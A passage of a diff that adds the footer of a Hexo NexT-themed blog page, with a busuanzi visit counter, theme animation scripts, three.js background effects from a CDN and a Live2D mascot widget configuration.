+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js"></script>
+    <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/canvas_sphere.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
